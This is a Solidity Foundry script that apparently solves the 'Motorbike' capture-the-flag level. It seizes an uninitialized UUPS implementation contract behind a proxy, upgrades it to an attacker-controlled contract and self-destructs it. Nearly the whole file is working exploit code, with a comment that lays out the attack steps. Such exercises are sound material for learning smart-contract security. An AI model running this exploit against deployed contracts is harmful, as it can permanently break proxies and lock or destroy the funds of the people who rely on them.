// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "../lib/forge-std/src/Script.sol";
import {HelperConfigLib} from "./config/HelperConfig.sol";

/**
 ** They used delegatecall on the constructor to initialize the implementation contract so the initialized==false in the implementation contract
 ** So first we need to find the address of the implementation contract which we can do by reading implementation slot
 ** then we initialize the implementation contract and becomes the upgrader of it
 **  then we upgrade the implementation contract to the new implementation contract which is a malicious contract we control
 ** selfdestruct our malicious contract.
 */

interface IImplementation {
    function initialize() external;
    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable;
}

contract MotorBikeAttacker is Script, HelperConfigLib {
    function run(address _victimAddress) external {
        vm.startBroadcast(ATTACKER_KEY);
        bytes32 implmentationSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        IImplementation implementationContract = IImplementation(
            address(
                uint160(uint256(vm.load(_victimAddress, implmentationSlot)))
            )
        );
        console.log(
            "Implementation Contract Address => ",
            address(implementationContract)
        );

        implementationContract.initialize();

        MaliciousImplementation maliciousImpl = new MaliciousImplementation();

        implementationContract.upgradeToAndCall(
            address(maliciousImpl),
            abi.encodeWithSignature("initialize()")
        );

        address newImplementationSlotValue = address(
            uint160(
                uint256(
                    vm.load(address(implementationContract), implmentationSlot)
                )
            )
        );

        console.log(
            "New Implementation slot value => ",
            newImplementationSlotValue
        );

        require(
            newImplementationSlotValue == address(maliciousImpl),
            "Implementation slot is not updated"
        );

        vm.stopBroadcast();
    }
}

contract MaliciousImplementation {
    function initialize() public {
        selfdestruct(payable(msg.sender));
    }
}
